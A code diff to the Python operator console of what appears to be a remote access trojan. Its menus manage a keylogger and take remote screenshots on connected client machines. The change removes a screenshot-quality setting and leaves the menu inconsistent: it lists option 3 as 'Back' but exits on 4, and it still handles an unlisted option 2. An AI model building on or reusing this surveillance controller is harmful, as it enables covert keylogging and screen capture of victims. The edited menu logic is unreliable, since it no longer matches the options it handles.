@@ -175,7 +175,7 @@ class Controller:
             elif choice == "8":
                 self.keylogger_management_menu(client_id)
             elif choice == "9":
-                self.screenshot_management_menu(client_id)
+                self.handle_take_screenshot(client_id, multi=False)
             elif choice == "10":
                 break
             else:
@@ -633,9 +633,7 @@ class Controller:
             print(f"SCREENSHOT MANAGEMENT - Client: {client_id}")
             print("="*50)
             print("1. 📷 Take Single Screenshot")
-            print("2. 🖥️ Take Multi-Display Screenshot")
-            print("3. ⚙️ Configure Screenshot Quality")
-            print("4. 🔙 Back to process menu")
+            print("3. 🔙 Back to process menu")
             
             choice = input("\nSelect option(1-4): ").strip()
             
@@ -643,8 +641,6 @@ class Controller:
                 self.handle_take_screenshot(client_id, multi=False)
             elif choice == "2":
                 self.handle_take_screenshot(client_id, multi=True)
-            elif choice == "3":
-                self.handle_screenshot_config(client_id)
             elif choice == "4":
                 break
             else:
@@ -678,29 +674,6 @@ class Controller:
             error = result.get('error', 'Unknown error') if result else 'No response'
             print(f"[-]Screenshot failed: {error}")
     
-    def handle_screenshot_config(self, client_id):
-        """Configurer les paramètres screenshot"""
-        print("\n[+] Configure screenshot settings:")
-        quality = input("Quality (30-95): ").strip()
-        max_width = input("Max width (pixels): ").strip()
-        
-        data = {}
-        if quality.isdigit():
-            data['quality'] = int(quality)
-        if max_width.isdigit():
-            data['max_width'] = int(max_width)
-        
-        if data:
-            result = self.send_process_command(client_id, "screenshot_config", data)
-            if result and result.get('success'):
-                print("[+] Screenshot configuration updated")
-                print(f"    Quality: {result.get('quality', 'N/A')}")
-                print(f"    Max width: {result.get('max_width', 'N/A')}")
-            else:
-                error = result.get('error', 'Unknown error') if result else 'No response'
-                print(f"[-] Configuration failed: {error}")
-        else:
-            print("[-] No valid configuration provided")
     
     def save_screenshot_to_file(self, screenshot_data, client_id):
         """Sauvegarder le screenshot dans un fichier"""
